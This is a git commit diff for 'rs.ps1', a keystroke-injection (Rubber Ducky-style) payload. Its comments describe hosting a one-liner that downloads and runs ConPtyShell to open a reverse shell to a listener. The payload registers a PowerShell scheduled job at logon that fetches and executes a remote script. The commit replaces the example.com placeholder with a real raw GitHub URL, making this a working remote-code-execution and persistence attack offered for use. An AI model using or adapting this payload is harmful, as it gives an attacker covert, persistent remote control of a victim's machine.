33c347ad41b04f1151ce8c4682c9065c782540c4
kalrizin <103393951+kalrizin@users.noreply.github.com>
2025-03-02 22:09:54 -0500

    Update rs.ps1

--- rs.ps1
+++ rs.ps1
@@ -8,7 +8,7 @@ REM Have IP and port 87 open and listening on server side for netcat reverse she
 REM Create a txt file with the command below in it, replacing the ip to your servers ip:
 REM IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.10 87
 REM Host the text file online on github or your own web server or something
-REM Then in the payload, replace https://example.com/txt/load.txt with the url that you are hosting your txt file in raw format
+REM Then in the payload, replace https://raw.githubusercontent.com/kalrizin/shellys-pers/refs/heads/main/rs.txt with the url that you are hosting your txt file in raw format
 GUI r
 DELAY 4000
 STRING powershell
@@ -18,7 +18,7 @@ LEFT
 DELAY 4000
 ENTER
 DELAY 4000
-STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://example.com/txt/load.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
+STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://raw.githubusercontent.com/kalrizin/shellys-pers/refs/heads/main/rs.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
 DELAY 4000
 ENTER
 DELAY 8000
